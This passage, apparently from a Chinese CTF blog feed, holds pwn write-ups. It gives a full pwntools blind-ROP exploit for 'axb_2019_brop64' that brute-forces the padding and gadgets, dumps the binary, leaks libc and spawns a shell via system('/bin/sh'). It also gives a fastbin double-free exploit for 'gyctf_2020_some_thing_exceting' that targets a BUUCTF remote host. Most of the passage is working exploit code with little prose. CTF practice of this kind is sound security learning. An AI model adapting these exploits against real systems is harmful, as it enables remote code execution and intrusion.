class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">                payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">                payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">                payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">                payload += p64(<span class="number">0x400000</span>+process_now_had_received_length)</span><br><span class="line">                payload += p64(func_plt)</span><br><span class="line">                payload += p64(stop_gadget)</span><br><span class="line">                sh.send(payload)</span><br><span class="line">                sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">                received_data = sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(received_data) == <span class="number">0</span> :</span><br><span class="line">                    file_content += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                    process_now_had_received_length += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    file_content += received_data</span><br><span class="line">                    process_now_had_received_length += <span class="built_in">len</span>(received_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> process_now_had_received_length == process_old_had_received_length :</span><br><span class="line">                log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(process_old_had_received_length) +<span class="string">&#x27; byte file!&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_brop64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                    fout.write(file_content)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            process_old_had_received_length = process_now_had_received_length</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Goodbye!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> sh.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_stop_gadget</span>(<span class="params">old_return_addr,padding_length</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length + p16(maybe_low_byte))</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(<span class="string">&quot;We found a stop gadget is &quot;</span> + <span class="built_in">hex</span>(old_return_addr+maybe_low_byte))</span><br><span class="line">                <span class="keyword">return</span> (old_return_addr+padding_length)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_brop_gadget</span>(<span class="params">libc_csu_init_address_maybe,padding_length,stop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(libc_csu_init_address_maybe+maybe_low_byte) </span><br><span class="line">            payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">            payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a brop gadget is &quot;</span> + <span class="built_in">hex</span>(</span><br><span class="line">                        libc_csu_init_address_maybe+maybe_low_byte</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (libc_csu_init_address_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_func_plt</span>(<span class="params">func_plt_maybe,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0600</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">            payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">            payload += p64(func_plt_maybe+maybe_low_byte)</span><br><span class="line">            payload += p64(stop_gadget)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ELF&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a function plt address is &quot;</span> + <span class="built_in">hex</span>(func_plt_maybe+maybe_low_byte)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (func_plt_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>(<span class="params">func_plt,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    process_old_had_received_length=<span class="number">0</span></span><br><span class="line">    process_now_had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">                payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">                payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">                payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">                payload += p64(<span class="number">0x400000</span>+process_now_had_received_length)</span><br><span class="line">                payload += p64(func_plt)</span><br><span class="line">                payload += p64(stop_gadget)</span><br><span class="line">                sh.send(payload)</span><br><span class="line">                sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">                received_data = sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(received_data) == <span class="number">0</span> :</span><br><span class="line">                    file_content += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                    process_now_had_received_length += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    file_content += received_data</span><br><span class="line">                    process_now_had_received_length += <span class="built_in">len</span>(received_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> process_now_had_received_length == process_old_had_received_length :</span><br><span class="line">                log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(process_old_had_received_length) +<span class="string">&#x27; byte file!&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_brop64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                    fout.write(file_content)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            process_old_had_received_length = process_now_had_received_length</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding_length=<span class="number">216</span></span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br><span class="line"></span><br><span class="line">old_return_addr=<span class="number">0x400834</span></span><br><span class="line"><span class="keyword">if</span> old_return_addr <span class="keyword">is</span> null:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    old_return_addr=u64(sh.recvuntil(<span class="string">&#x27;Goodbye!&#x27;</span>).strip(<span class="string">&#x27;Goodbye!&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;The old return address is &#x27;</span>+ <span class="built_in">hex</span>(old_return_addr))</span><br><span class="line"></span><br><span class="line">stop_gadget=<span class="number">0x4007D6</span></span><br><span class="line"><span class="keyword">if</span> stop_gadget <span class="keyword">is</span> null:</span><br><span class="line">    stop_gadget=Find_stop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length)</span><br><span class="line"></span><br><span class="line">brop_gadget=<span class="number">0x40095A</span></span><br><span class="line"><span class="keyword">if</span> brop_gadget <span class="keyword">is</span> null:</span><br><span class="line">    brop_gadget=Find_brop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget)</span><br><span class="line"></span><br><span class="line">func_plt=<span class="number">0x400635</span></span><br><span class="line"><span class="keyword">if</span> func_plt <span class="keyword">is</span> null:</span><br><span class="line">    func_plt=Find_func_plt(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget,brop_gadget)</span><br><span class="line"></span><br><span class="line">is_dumped=<span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> is_dumped <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">True</span>:</span><br><span class="line">    Dump_file(func_plt,padding_length,stop_gadget,brop_gadget)</span><br><span class="line">    is_dumped=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">sh = get_sh()</span><br><span class="line">puts_got_addr=<span class="number">0x601018</span></span><br><span class="line">puts_plt_addr=<span class="number">0x400640</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(puts_got_addr)</span><br><span class="line">payload += p64(puts_plt_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">puts_addr = u64(sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length</span><br><span class="line">payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(stop_gadget)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><h1 id="0x55-gyctf-2020-some-thing-exceting"><a href="#0x55-gyctf-2020-some-thing-exceting" class="headerlink" title="0x55.gyctf_2020_some_thing_exceting"></a>0x55.gyctf_2020_some_thing_exceting</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400896</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *fp; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  fp = fopen(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fp )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Emmmmmm!Maybe you want Fool me!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  byte_6020A0 = <span class="number">0x60</span>;</span><br><span class="line">  fgets(s, <span class="number">0x2D</span>, fp);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在s的地方写了flag：</p><p><img src="/2021/12/08/BUU-PWN-0x50-0x5F/image-20211209163407055.png" alt="image-20211209163407055"></p><p>double free ，将flag的地址写到第一个free的fd指针，之后show的时候就会将flag打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25003</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./gyctf_2020_some_thing_exceting&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size_1,size_2,content_1=<span class="string">&#x27;1&#x27;</span>,content_2=<span class="string">&#x27;1&#x27;</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;to do :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ba&#x27;s length : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size_1))</span><br><span class="line">p.recvuntil(<span class="string">&quot;ba : &quot;</span>)</span><br><span class="line">p.send(content_1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;na&#x27;s length : &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size_2))</span><br><span class="line">p.recvuntil(<span class="string">&quot;na : &quot;</span>)</span><br><span class="line">p.send(content_2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;to do :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;project ID : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;to do :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Banana ID : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">backdoor = <span class="number">0x6020a0</span></span><br><span class="line">payload = p64(backdoor-<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>, payload,payload)<span class="comment">#2</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x50-mrctf2020-shellcode-revenge（可见字符shellcode）&quot;&gt;&lt;a href=&quot;#0x50-mrctf2020-shellcode-revenge（可见字符shellcode）&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>编译原理Note</title>
    <link href="http://example.com/2021/12/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2021/12/01/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/</id>
    <published>2021-11-30T16:00:00.000Z</published>
    <updated>2021-12-02T07:24:24.113Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" 